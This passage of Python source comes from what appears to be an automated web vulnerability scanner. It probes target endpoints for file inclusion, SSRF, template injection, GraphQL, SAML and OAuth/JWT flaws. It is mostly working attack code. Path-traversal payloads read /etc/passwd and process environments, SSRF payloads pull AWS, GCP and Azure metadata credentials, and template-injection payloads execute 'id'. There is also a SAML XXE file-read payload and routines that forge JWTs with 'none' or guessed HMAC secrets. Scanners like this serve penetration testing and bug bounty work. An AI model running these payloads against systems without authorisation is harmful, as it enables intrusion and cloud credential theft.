    "../../../windows/win.ini",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../boot.ini",
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
]
LFI_WINDOWS_SIGS = [
    "[boot loader]", "[fonts]", "[extensions]",
    "[mci extensions]", "[files]",
    "# Copyright (c) Microsoft", "# localhost",
    "drivers\\etc\\hosts", "WINDOWS\\",
]

def _lfi_detect_os(base_url: str) -> str:
    """
    Fingerprint target OS from Server header + error responses.
    Returns 'windows', 'linux', or 'unknown'.
    """
    try:
        r = _get(base_url, timeout=6)
        if not r: return 'unknown'
        server = r[1].get('Server','').lower()
        x_powered = r[1].get('X-Powered-By','').lower()
        body = r[2].lower()
        # Windows indicators
        if any(x in server for x in ['iis','microsoft-iis','microsoft httpapi']):
            return 'windows'
        if 'asp.net' in x_powered or 'asp.net' in server:
            return 'windows'
        # Linux indicators
        if any(x in server for x in ['apache','nginx','lighttpd','gunicorn','uwsgi']):
            return 'linux'
        if 'php' in x_powered or 'ubuntu' in server or 'debian' in server:
            return 'linux'
    except: pass
    return 'unknown'


def check_lfi(endpoints: List[str]) -> List[dict]:
    findings = []
    tested   = set()

    # Merge: payload_intel + payload_manager (Assetnote/PAT) + LFI_PAYLOADS + wordlist
    wl_payloads = _load_lfi_wordlist()
    _lfi_const  = list(LFI_PAYLOADS) + [p for p in wl_payloads if p not in LFI_PAYLOADS]
    base_payloads = _build_merged_payloads("lfi", _lfi_const, param="file", limit=30)
    # H1 observed still prepended on top (highest signal)
    _h1_lfi = _tl_h1_payloads("lfi")
    if _h1_lfi:
        base_payloads = [p for p in _h1_lfi if p not in base_payloads] + base_payloads
        log.info(f"[lfi] H1 payloads prepended: {len(_h1_lfi)} → {len(base_payloads)} total")

    # ── OS fingerprinting gate ────────────────────────────────────────────────
    # Detect target OS to send the right payload set
    # Avoids sending Linux paths to IIS and Windows paths to nginx
    _detected_os = {}  # {base_url: 'windows'|'linux'|'unknown'}
    for ep in endpoints[:20]:
        base = (urllib.parse.urlparse(ep).scheme + '://' +
                urllib.parse.urlparse(ep).netloc)
        if base not in _detected_os:
            _detected_os[base] = _lfi_detect_os(base)
    log.info(f"[lfi] OS fingerprint: {dict((v,list(_detected_os.values()).count(v)) for v in set(_detected_os.values()))}")

    # Select payload set based on OS
    def _payloads_for(ep):
        base = urllib.parse.urlparse(ep).scheme + '://' + urllib.parse.urlparse(ep).netloc
        os_type = _detected_os.get(base, 'unknown')
        if os_type == 'windows':
            return LFI_WINDOWS_PAYLOADS + base_payloads[:10]   # Windows first
        elif os_type == 'linux':
            return base_payloads[:40]                            # Linux only
        else:
            return base_payloads[:20] + LFI_WINDOWS_PAYLOADS[:8]  # Both, capped

    log.info(f"[lfi] testing with OS-gated payloads against {len(endpoints[:400])} endpoints")

    lfi_params = ["file","path","page","dir","document","folder","root",
                  "include","inc","show","view","template","lang","module",
                  "load","read","content","action","cat","item","id","name",
                  "resource","url","doc","filename","filepath","location",
                  "src","source","data","report","download","import"]
    # ── H1 param reordering: move H1-observed high-freq lfi params to front ──
    # After 100+ reports: h1_params table shows which param names actually
    # appeared in real LFI disclosures. Those get tested before the tail.
    try:
        from engine.h1_ingest import get_param_patterns as _h1_pp
        _h1_lfi_params = [r["value"] for r in _h1_pp("lfi", min_frequency=1, limit=20)]
        if _h1_lfi_params:
            _h1_first = [p for p in _h1_lfi_params if p in lfi_params]
            _rest = [p for p in lfi_params if p not in _h1_first]
            lfi_params = _h1_first + _rest
            log.info(f"[lfi] H1 param reorder: {_h1_first[:5]} moved to front")
    except Exception as _h1lfi_e:
        log.debug(f"[lfi] H1 param reorder: {_h1lfi_e}")

    # Detection signatures (Linux + Windows)
    SIGS = [
        # Linux
        "root:x:","root:!:","daemon:","nobody:",
        "DOCUMENT_ROOT","PATH=/usr","SERVER_ADDR",
        "Linux version","#define __LINUX",
        "PRIVKEY","BEGIN RSA","BEGIN EC PRIVATE",
        "APP_SECRET","DATABASE_URL","DB_PASSWORD",
        "aws_access_key","aws_secret","AKIA",
        "/bin/bash","/bin/sh","/usr/bin/python",
        "<?php","<?=",
        "define('DB_","define('AUTH_KEY",
        # Windows
        "[boot loader]","[fonts]","[extensions]","[mci extensions]",
        "# Copyright (c) Microsoft","WINDOWS\\system32",
        "[drivers]","[operating systems]",
    ]

    for ep in endpoints[:400]:
        if _stopped_lfi(): break
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in lfi_params:
            if param not in qs: continue
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)

            for payload in _payloads_for(ep)[:30]:
                if _cancelled(): break
                nq   = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=8)
                if not r: continue
                status, hdrs, body = r
                if any(s in body for s in SIGS):
                    findings.append(F("lfi","critical", ep,
                        f"LFI/Path Traversal in '{param}'",
                        param   = param,
                        payload = payload,
                        preview = body[:400],
                        poc     = f"curl '{test}'",
                        curl    = f"curl '{test}'",
                        impact  = "Read arbitrary server files: /etc/passwd, /etc/shadow, config files, source code, private keys",
                        remediation = "Validate all file paths with an allowlist. Use basename(). Never pass user input directly to file functions."))
                    break  # found -- move to next param

    # Also test path-based LFI (no params needed)
    path_payloads = [
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/....//....//....//etc/passwd",
        # PHP filter chain bypass
        "/../../../etc/passwd%00",      # null byte (PHP < 5.3)
        "/php://filter/convert.base64-encode/resource=/etc/passwd",
        "/php://filter/read=string.rot13/resource=/etc/passwd",
        "/expect://id",                 # RCE via expect
        "/proc/self/cmdline",          # process info
        "/proc/self/environ",          # env vars with secrets
    ]
    tested_paths = set()
    for host in list(set(
        urllib.parse.urlparse(ep).scheme + "://" + urllib.parse.urlparse(ep).netloc
        for ep in endpoints[:100] if ep.startswith("http")
    ))[:20]:
        if _stopped_lfi(): break
        for payload in path_payloads:
            test = host.rstrip("/") + payload
            if test in tested_paths: continue
            tested_paths.add(test)
            r = _get(test, timeout=6)
            if r and any(s in r[2] for s in SIGS):
                findings.append(F("lfi","critical", host,
                    "Path-based LFI/Directory Traversal",
                    payload = payload,
                    preview = r[2][:400],
                    poc     = f"curl '{test}'",
                    curl    = f"curl '{test}'",
                    impact  = "Read arbitrary files from server filesystem",
                    remediation = "Validate and sanitize all path inputs server-side."))
                break


    # Phase 2: POST body LFI
    LFI_SIGS2 = ["root:x:","root:!:","daemon:","[boot loader]",
                  "DOCUMENT_ROOT","AWS_ACCESS","DB_PASSWORD","APP_SECRET"]
    for ep in endpoints[:30]:
        for (action, param, _) in _discover_post_params(ep)[:5]:
            for payload in ["../../../etc/passwd","../../etc/passwd",
                            "php://filter/convert.base64-encode/resource=/etc/passwd",
                            "/proc/self/environ"]:
                r = _post_inject(action, param, payload)
                if r and any(s in r[2] for s in LFI_SIGS2):
                    findings.append(F("lfi","critical",action,
                        f"LFI via POST body in '{param}'",
                        param=param, payload=payload,
                        poc=f"curl -X POST '{action}' -d '{param}={payload}'",
                        impact="Read arbitrary files including credentials and source code",
                        remediation="Validate file paths. Never pass user input to file functions."))
                    break

    return findings

def _stopped_lfi():
    """Non-blocking stop check for LFI loop."""
    return False  # actual stop handled by parent thread

# ── 9. SSRF ───────────────────────────────────────────────────────────────────
# Load SSRF payloads from file
def _load_ssrf_payloads():
    own = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "ssrf.txt")
    if os.path.isfile(own):
        with open(own) as f:
            return [(l.strip(), ["aws","169","metadata","internal"]) 
                    for l in f if l.strip() and not l.startswith("#")]
    return []

SSRF_PARAMS=["url","target","dest","redirect","uri","path","site","html",
             "host","to","out","view","dir","show","open","fetch","load",
             "src","href","img","source","resource","next","image","data",
             "callback","return","forward","jump","link","file","page","ref",
             "proxy","continue","window","domain","server","feed","from",
             "endpoint","request","fetch","curl","pull","import","endpoint"]

SSRF_PAYLOADS=[
    # AWS metadata
    ("http://169.254.169.254/latest/meta-data/",           ["ami-id","instance-id","hostname","local-ipv4"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId","SecretAccessKey"]),
    ("http://169.254.169.254/latest/user-data",            ["#!/","cloud-init"]),
    # AWS bypass variants
    ("http://169.254.169.254.nip.io/latest/meta-data/",    ["ami-id","instance-id"]),
    ("http://[::ffff:169.254.169.254]/latest/meta-data/",  ["ami-id","instance-id"]),
    ("http://0251.0376.0251.0376/latest/meta-data/",       ["ami-id","instance-id"]),  # octal
    ("http://2852039166/latest/meta-data/",                ["ami-id","instance-id"]),  # decimal
    ("http://0xa9fea9fe/latest/meta-data/",                ["ami-id","instance-id"]),  # hex
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/", ["project","instance","serviceAccounts"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token"]),
    # Azure metadata
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute","network"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/",                ["id","hostname","region"]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/",           ["instance-id","hostname"]),
    # Internal localhost
    ("http://127.0.0.1/",                                  ["localhost","127.0.0.1","html"]),
    ("http://localhost/",                                   ["localhost","html"]),
    ("http://0.0.0.0/",                                    ["html","localhost"]),
    ("http://127.1/",                                      ["html","localhost"]),
    ("http://0/",                                          ["html","localhost"]),
    # Internal services
    ("http://127.0.0.1:6379/",                             ["redis","PONG","+PONG"]),  # Redis
    ("http://127.0.0.1:27017/",                            ["mongodb","db"]),          # MongoDB
    ("http://127.0.0.1:9200/",                             ["elasticsearch","cluster"]),# Elasticsearch
    ("http://127.0.0.1:8080/",                             ["html","server","tomcat"]),
    ("http://127.0.0.1:8443/",                             ["html","server"]),
    # Protocol handlers
    ("file:///etc/passwd",                                 ["root:","daemon:"]),
    ("file:///windows/win.ini",                            ["[fonts]","[extensions]"]),
    ("dict://127.0.0.1:6379/PING",                        ["PONG","+PONG"]),
    ("gopher://127.0.0.1:6379/_PING%0d%0a",               ["PONG","+PONG"]),
    ("sftp://127.0.0.1/",                                  ["sftp","ssh"]),
    ("ftp://127.0.0.1/",                                   ["ftp","220"]),
    # URL bypass tricks
    ("http://127.0.0.1@evil.com/",                         ["html"]),
    ("http://evil.com@127.0.0.1/",                         ["html","localhost"]),
    ("http://127.0.0.1#evil.com",                          ["html","localhost"]),
    ("http://127.0.0.1?.evil.com",                         ["html","localhost"]),
    # CNAME/DNS rebinding
    ("http://1.1.1.1.nip.io/",                             ["html","1.1.1.1"]),
    # AWS IMDS v2 (token-based)
    ("http://169.254.169.254/latest/api/token",      ["TTL","token","ami"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKey","SecretKey","Token"]),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     ["access_token","token_type","expires_in"]),
    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", ["project"]),
    # Azure IMDS
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute","network","azure"]),
    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     ["access_token","client_id"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", ["droplet","region","auth_key"]),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v2/instance/", ["displayName","shape","region"]),
    # Kubernetes service account  
    ("http://kubernetes.default.svc/api/v1/namespaces", ["namespace","items"]),
    ("http://10.0.0.1/api/v1", ["apiVersion","kind"]),
    # Internal Redis, Elasticsearch, Consul
    ("http://127.0.0.1:6379/", ["redis","PONG","Connected"]),
    ("http://127.0.0.1:9200/", ["cluster_name","status","elasticsearch"]),
    ("http://127.0.0.1:8500/v1/catalog/services", ["consul","services"]),
]

def check_ssrf(endpoints:List[str]) -> List[dict]:
    findings=[]
    tested=set()
    for ep in endpoints[:400]:
        if "=" not in ep: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        # Test SSRF-named params first (highest signal), then all other params
        # ── H1 param ordering: move H1-observed high-freq ssrf params first ──
        # First time per scan: build ranked param list from H1 data.
        # Subsequent endpoints reuse the cached list (no repeated DB hit).
        # Use thread-local cache so each scan gets its own param order
        # (function attribute would bleed across concurrent scans in the same process)
        if not getattr(_tl, '_h1_ssrf_params_cached', False):
            try:
                from engine.h1_ingest import get_param_patterns as _h1_pp
                _h1_ssrf_ranked = [r["value"] for r in _h1_pp("ssrf", min_frequency=1, limit=20)]
                _tl._h1_ssrf_params = _h1_ssrf_ranked if _h1_ssrf_ranked else []
            except Exception:
                _tl._h1_ssrf_params = []
            _tl._h1_ssrf_params_cached = True
        _h1_ssrf_front = getattr(_tl, '_h1_ssrf_params', [])
        # Merge: H1-ranked first, then remaining SSRF_PARAMS, then any other QS params
        _merged = list(_h1_ssrf_front)
        for _p in SSRF_PARAMS:
            if _p not in _merged: _merged.append(_p)
        all_params = _merged + [p for p in qs.keys() if p not in _merged]
        for param in all_params:
            if param not in qs: continue
            key=(ep.split("?")[0],param)
            if key in tested: continue
            tested.add(key)
            # payload_manager (Assetnote+PAT) merged with SSRF_PAYLOADS per param
            _ssrf_merged = getattr(_tl, f'_ssrf_payloads_{param}', None)
            if _ssrf_merged is None:
                _ssrf_merged = _build_merged_payloads(
                    "ssrf", list(SSRF_PAYLOADS), param=param, limit=30
                )
                setattr(_tl, f'_ssrf_payloads_{param}', _ssrf_merged)
            _ssrf_all = _load_ssrf_payloads() + list(SSRF_PAYLOADS)
            # Prepend H1-observed SSRF payloads (real cloud metadata hits)
            _h1_ssrf = _tl_h1_payloads("ssrf")
            if _h1_ssrf:
                _h1_ssrf_tuples = [(p, []) for p in _h1_ssrf]
                _ssrf_all = _h1_ssrf_tuples + _ssrf_all
            # Payload intelligence: prepend ranked SSRF payloads
            try:
                from engine.payload_intel import select_payloads as _pi_sel_s
                _pi_ssrf = [(p, []) for p in _pi_sel_s("ssrf", param_name=param, top_n=8)
                            if (p, []) not in _ssrf_all[:8]]
                if _pi_ssrf:
                    _ssrf_all = _pi_ssrf + _ssrf_all
                    log.info(f"[ssrf] payload_intel: {len(_pi_ssrf)} ranked payloads prepended")
            except Exception: pass
            for payload,sigs in _ssrf_all[:50]:
                nq=dict(qs); nq[param]=[payload]
                test=urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq,doseq=True)))
                r=_get(test,timeout=10)
                if not r: continue
                status,hdrs,body=r
                # Check specific sigs or any internal indicator
                all_sigs = sigs + ["ami-id","instance-id","computeMetadata",
                                   "root:","metadata","PONG","<!DOCTYPE"]
                # Detect SSRF: 200 with metadata OR 302 to internal OR error leaking data
                ssrf_hit = False
                if status == 200 and any(s.lower() in body.lower() for s in all_sigs):
                    ssrf_hit = True
                elif status in (301, 302, 303, 307, 308):
                    # Redirect to internal IP = SSRF
                    loc = hdrs.get("Location","")
                    if any(x in loc for x in ["169.254","127.0.0","10.","192.168","metadata"]):
                        ssrf_hit = True
                elif status in (500, 503) and any(s.lower() in body.lower() for s in
                    ["connection refused","no route to host","connection timed out",
                     "SSRF","ECONNREFUSED","Name or service not known"]):
                    ssrf_hit = True
                if ssrf_hit:
                    sev = "critical" if status == 200 else "high"
                    _cv = _confirm_finding("ssrf", ep, param, payload,
                                           _response=(status, hdrs, body))
                    if not _cv["confirmed"]:
                        log.debug(f"[ssrf] unconfirmed: {_cv['proof']}")
                        break
                    findings.append(F("ssrf", sev, ep,
                        f"SSRF via '{param}' -- {payload[:60]}",
                        param=param, payload=payload,
                        status=status,
                        proof=_cv["proof"],
                        preview=body[:400],
                        poc=f'curl "{test}"',
                        confidence=_cv["confidence"],
                        impact="Access cloud metadata (AWS/GCP/Azure), internal services, potential credential theft",
                        remediation="Validate/whitelist URLs server-side. Block internal IP ranges at network level."))
                    break
    return findings


def check_ssrf_referer(targets: List[str], oob_host: str = "") -> List[dict]:
    """SSRF via Referer, X-Forwarded-For, and other headers -- often missed."""
    findings = []
    if not oob_host: return findings
    for url in targets[:20]:
        for hdr in ["Referer", "Origin", "X-Forwarded-Host", "True-Client-IP",
                    "X-Real-IP", "X-Custom-IP-Authorization"]:
            for payload in [f"http://{oob_host}/ssrf-{hdr.lower()}",
                            f"http://169.254.169.254/latest/meta-data/",
                            f"http://metadata.google.internal/computeMetadata/v1/"]:
                try:
                    r = _req(url, "GET", headers={hdr: payload}, timeout=8)
                    if not r: continue
                    if r[0] == 200 and any(s in r[2] for s in
                        ["ami-id","instance-id","metadata","computeMetadata"]):
                        findings.append(F("ssrf","critical",url,
                            f"SSRF via {hdr} header -- cloud metadata accessible",
                            header=hdr, payload=payload,
                            poc=f"curl -H '{hdr}: {payload}' '{url}'",
                            impact="Cloud metadata/credential theft via header injection",
                            remediation="Validate all URL-like values in HTTP headers server-side."))
                        break
                except: pass
    return findings


# ── 10. SSTI ─────────────────────────────────────────────────────────────────
SSTI_PAYLOADS=[
    # Math eval -- confirms template execution across all engines
    ("{{7*7}}",["49"]),
    ("${7*7}",["49"]),
    ("#{7*7}",["49"]),
    ("<%= 7*7 %>",["49"]),
    ("{{7*'7'}}",["7777777","49"]),
    ("${{7*7}}",["49"]),
    ("{7*7}",["49"]),
    ("*{7*7}",["49"]),
    # Config/env leak
    ("{{config}}",["SECRET_KEY","DEBUG","DATABASE","SQLALCHEMY"]),
    ("{{request.environ}}",["SERVER_SOFTWARE","PATH","GATEWAY_INTERFACE"]),
    ("{php}echo 7*7;{/php}",["49"]),
    # Twig RCE
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",["uid="]),
    # Smarty RCE
    ("{system('id')}",["uid="]),
    # Freemarker RCE
    ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',["uid="]),
    # Jinja2 RCE (Python 3)
    ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",["uid="]),
    # Pebble
    ("{% for i in range(7) %}7{% endfor %}",["7777777"]),
]

def check_ssti(endpoints:List[str]) -> List[dict]:
    findings=[]
    tested=set()
    # ── H1 param ranking: surface template/render/view params first ───────────
    # PARAM_BUG_MAP maps 'template','render','view','format' → ssti.
    # Without this, ssti tests fire on arbitrary QS params in dict order.
    try:
        from engine.h1_intel import PARAM_BUG_MAP as _pbm
        _ssti_params_ranked = [p for p,bugs in _pbm.items() if 'ssti' in bugs]
    except Exception:
        _ssti_params_ranked = ["template","render","view","format","name","lang"]
    # Merge: payload_intel + payload_manager (Assetnote/PAT) + SSTI_PAYLOADS
    _ssti_pl = _build_merged_payloads("ssti", list(SSTI_PAYLOADS), limit=20)
    # H1 observed prepended on top
    _h1_ssti = _tl_h1_payloads("ssti")
    if _h1_ssti:
        _h1_wrapped = [(p, ["49","7"]) for p in _h1_ssti
                       if p not in {x[0] if isinstance(x,tuple) else x for x in _ssti_pl}]
        _ssti_pl = _h1_wrapped + _ssti_pl
        log.info(f"[ssti] H1 payloads prepended: {len(_h1_wrapped)} → {len(_ssti_pl)} total")
    # payload_intel and payload_manager already merged via _build_merged_payloads above
    for ep in endpoints[:200]:
        if "=" not in ep: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        # Reorder: H1-ranked params first, then remaining in original order
        _ranked = [p for p in _ssti_params_ranked if p in qs]
        _others = [p for p in qs if p not in _ssti_params_ranked]
        _param_order = (_ranked + _others)[:5]  # test up to 5, ranked params first
        for param in _param_order:
            key=(ep.split("?")[0],param)
            if key in tested: continue
            tested.add(key)
            for payload,expected in _ssti_pl:
                nq=dict(qs); nq[param]=[payload]
                test=urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq,doseq=True)))
                r=_get(test,timeout=8)
                if not r: continue
                body=r[2]
                if any(e in body for e in expected):
                    findings.append(F("ssti","critical",ep,
                        f"SSTI in '{param}' -- template evaluated: {payload}={expected[0]}",
                        param=param,payload=payload,result=expected[0],
                        poc=f"curl '{test}'",
                        impact="Remote code execution via template engine",
                        remediation="Never pass user input to template engines. Use sandboxed rendering."))
                    break

    # Phase 2: POST body SSTI
    for ep in endpoints[:30]:
        for (action, param, _) in _discover_post_params(ep)[:5]:
            for payload, sigs in [("{{7*7}}",["49"]),("${7*7}",["49"]),("#{7*7}",["49"])]:
                r = _post_inject(action, param, payload)
                if r and any(s in r[2] for s in sigs):
                    findings.append(F("ssti","critical",action,
                        f"SSTI via POST body in '{param}'",
                        param=param, payload=payload,
                        poc=f"curl -X POST '{action}' -d '{param}={payload}'",
                        impact="Remote code execution via template injection",
                        remediation="Never pass user input to template engines unsanitized."))
                    break

    return findings

# ── 11. GRAPHQL ───────────────────────────────────────────────────────────────
GRAPHQL_PATHS=["/graphql","/graphiql","/api/graphql","/v1/graphql",
               "/v2/graphql","/query","/gql","/graphql/console",
               "/api/v1/graphql","/public/graphql","/private/graphql"]

def check_graphql(url:str) -> List[dict]:
    findings=[]
    base=url.rstrip("/")
    intro=json.dumps({"query":"{ __schema { queryType { name } types { name kind } } }"}).encode()
    batch=json.dumps([{"query":"{ __typename }"},{"query":"{ __typename }"}]).encode()
    for path in GRAPHQL_PATHS:
        target=base+path
        # Introspection
        r=_req(target,"POST",
               headers={"Content-Type":"application/json","Accept":"application/json"},
               data=intro,timeout=10)
        if r and r[0]==200 and "__schema" in r[2]:
            # Parse available types
            types=[]
            try:
                d=json.loads(r[2])
                types=[t["name"] for t in d.get("data",{}).get("__schema",{}).get("types",[])
                       if t.get("kind")=="OBJECT" and not t["name"].startswith("__")]
            except: pass
            findings.append(F("graphql","high",target,
                "GraphQL introspection enabled",
                endpoint=path,types=types[:20],
                poc=f"curl -X POST {target} -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{queryType{{name}}}}}}\"}}' ",
                impact="Full schema disclosure enables targeted injection attacks",
                remediation="Disable introspection in production, implement query depth limits."))
        # Batch attack -- check response is array OR contains multiple data objects
        r2=_req(target,"POST",
                headers={"Content-Type":"application/json"},
                data=batch,timeout=8)
        if r2 and r2[0]==200:
            try:
                _bj = json.loads(r2[2] or "null")
                # Batch enabled: response is a list, OR a single obj where we sent 2 queries
                _batch_ok = isinstance(_bj, list) or (
                    isinstance(_bj, dict) and
                    r2[2].count('"data"') >= 2
                )
            except: _batch_ok = False
            if _batch_ok:
                findings.append(F("graphql","medium",target,
                    "GraphQL batch queries enabled -- DoS/brute-force risk",
                    endpoint=path,
                    poc=f"curl -X POST '{target}' -H 'Content-Type: application/json' -d '[{chr(34)}query{chr(34)}:{chr(34)}{chr(123)}__typename{chr(125)}{chr(34)}]'",
                    impact="Batch queries bypass rate limiting for brute-force attacks",
                    remediation="Implement query complexity limits and disable batch queries."))
        # GET-based query (CSRF)
        r3=_get(f"{target}?query={{__typename}}")
        if r3 and r3[0]==200 and "__typename" in r3[2]:
            findings.append(F("graphql","medium",target,
                "GraphQL accepts GET requests -- CSRF risk",
                endpoint=path,
                poc=f"curl '{target}?query={{__typename}}'",
                impact="CSRF attacks possible against GraphQL mutations",
                remediation="Only accept POST requests for mutations."))
    return findings

# ── 12. SAML ─────────────────────────────────────────────────────────────────
def check_saml(url:str) -> List[dict]:
    if not url or not isinstance(url, str) or not url.startswith("http"): return []
    """
    SAML attack surface:
    1. Metadata exposure (EntityDescriptor → schema mapping)
    2. XML Signature Wrapping (XSW) -- move valid sig to attack node
    3. XXE via SAML POST binding
    4. Signature stripping (remove ds:Signature entirely)
    5. SAML assertion replay
    """
    findings=[]
    base=url.rstrip("/")

    # SAML paths
    paths=["/saml/metadata","/saml2/metadata","/saml/sso","/saml/acs",
           "/saml/login","/auth/saml","/sso/saml","/.well-known/saml-configuration",
           "/Shibboleth.sso/Metadata","/api/saml/metadata","/saml/idp/metadata",
           "/saml/sp/metadata","/auth/sso","/federation/metadata",
           "/saml2/idp/metadata","/saml/idp","/realms/master/protocol/saml",
           "/adfs/ls/","/adfs/metadata/idp/federation"]

    for path in paths:
        r=_get(base+path,timeout=8)
        if not r: continue
        status,hdrs,body=r
        if not (status==200 and ("EntityDescriptor" in body or
                "saml" in body.lower() or "urn:oasis" in body)):
            continue

        sev = "critical" if "EntityDescriptor" in body else "high"
        ct  = hdrs.get("Content-Type","")

        # Extract entityID and SSO URLs for reporting
        import re as _re
        entity_id = _re.search(r"entityID=.([^<>]+).", body)
        sso_url   = _re.search(r"Location=.([^<>]+).", body)

        findings.append(F("saml", sev, base+path,
            f"SAML metadata exposed: {path}",
            endpoint=path,
            entity_id=entity_id.group(1) if entity_id else "",
            sso_url=sso_url.group(1) if sso_url else "",
            preview=body[:500],
            poc=f"curl '{base+path}'",
            attack_notes="1.XSW: clone Response+move Signature | 2.Strip ds:Signature | 3.XXE via SAMLResponse | 4.Assertion replay",
            impact="SSO bypass → account takeover without credentials",
            remediation="Validate XML signatures strictly. Verify InResponseTo. Use schema validation before parsing."))

        # Phase 2: Test XXE via ACS endpoint
        acs_paths = ["/saml/acs","/saml2/acs","/auth/saml/callback",
                     "/sso/acs","/SAML/AssertionConsumerService"]
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
            '<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>'
            '</samlp:Response>'
        )
        for acs in acs_paths:
            r2 = _req(base+acs, "POST",
                     headers={"Content-Type":"application/x-www-form-urlencoded"},
                     data=f"SAMLResponse={urllib.parse.quote(xxe_payload)}".encode(),
                     timeout=8)
            if r2 and any(s in r2[2] for s in ["root:x:","root:!:","daemon:"]):
                findings.append(F("saml","critical",base+acs,
                    "SAML XXE confirmed -- /etc/passwd read via SAMLResponse",
                    endpoint=acs,
                    preview=r2[2][:300],
                    poc=f"curl -X POST '{base+acs}' -d 'SAMLResponse=<xxe_payload>'",
                    impact="File read, SSRF, potential RCE via XXE in SAML assertion processing",
                    remediation="Disable external entities in XML parser before SAML processing."))
        break  # found a SAML endpoint, no need to continue

    return findings

# ── 13. OAUTH / JWT ───────────────────────────────────────────────────────────
def check_oauth(url:str) -> List[dict]:
    findings=[]
    base=url.rstrip("/")
    # Discovery endpoints
    for path in ["/.well-known/openid-configuration",
                 "/.well-known/oauth-authorization-server",
                 "/.well-known/jwks.json","/jwks.json",
                 "/oauth/token","/oauth2/token","/connect/token",
                 "/oauth/authorize","/oauth2/authorize",
                 "/auth/token","/api/auth","/api/oauth/token",
                 "/auth/realms/master/.well-known/openid-configuration"]:
        r=_get(base+path,timeout=8)
        if not r or r[0]!=200: continue
        body=r[2]
        sev="medium"
        issues=[]
        if "client_secret" in body: sev="critical"; issues.append("client_secret exposed")
        if "private_key" in body:   sev="critical"; issues.append("private_key exposed")
        if "issuer" in body or "authorization_endpoint" in body:
            issues.append("OIDC config exposed")
        if "keys" in body and "n" in body and "e" in body:
            issues.append("JWKS public keys exposed")
        findings.append(F("oauth",sev,base+path,
            f"OAuth/Auth endpoint: {path}",
            endpoint=path,issues=issues,
            preview=body[:300],
            impact="OAuth misconfiguration enables token theft and account takeover"))
    # Test implicit flow still enabled
    r=_get(f"{base}/oauth/authorize?response_type=token&client_id=test&redirect_uri=https://evil.com")
    if r and r[0] in (200,302) and "access_token" in r[1].get("Location",""):
        findings.append(F("oauth","critical",base+"/oauth/authorize",
            "OAuth implicit flow enabled -- token in URL",
            impact="Tokens leaked via Referer header and browser history"))
    return findings

def _jwt_b64d(s:str)->bytes:
    s=s.replace("-","+").replace("_","/")
    return base64.b64decode(s+"=="*((4-len(s)%4)%4))

def _jwt_b64e(b:bytes)->str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _jwt_forge_hmac(token: str, secret: str) -> str:
    """Forge JWT with HMAC-SHA256 and given secret."""
    try:
        import hmac, hashlib
        parts = token.split(".")
        if len(parts) < 2: return ""
        header_b64 = _jwt_b64e(b'{"alg":"HS256","typ":"JWT"}')
        payload_b64 = parts[1]
        signing_input = f"{header_b64}.{payload_b64}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        sig_b64 = _jwt_b64e(sig)
        return f"{header_b64}.{payload_b64}.{sig_b64}"
    except: return ""


def _jwt_forge_none(token:str)->str:
    try:
        parts=token.split(".")
        if len(parts)<2: return ""
        hdr=json.loads(_jwt_b64d(parts[0]))
        hdr["alg"]="none"
        return _jwt_b64e(json.dumps(hdr,separators=(",",":")).encode())+"."+parts[1]+"."
    except: return ""

def _jwt_forge_hs256(token:str,secret_or_key:str)->str:
    try:
        import hmac,hashlib
        parts=token.split(".")
        if len(parts)<2: return ""
        hdr=json.loads(_jwt_b64d(parts[0]))
        hdr["alg"]="HS256"
        new_h=_jwt_b64e(json.dumps(hdr,separators=(",",":")).encode())
        signing=f"{new_h}.{parts[1]}".encode()
        sig=hmac.new(secret_or_key.encode(),signing,hashlib.sha256).digest()
        return f"{new_h}.{parts[1]}.{_jwt_b64e(sig)}"
    except: return ""

def _jwt_try_weak_secrets(token:str)->tuple:
    try:
        import hmac,hashlib
        parts=token.split(".")
        signing=f"{parts[0]}.{parts[1]}".encode()
        expected=parts[2]
        for secret in ["secret","password","123456","qwerty","admin","test",
                       "jwt_secret","mysecret","supersecret","secret_key",
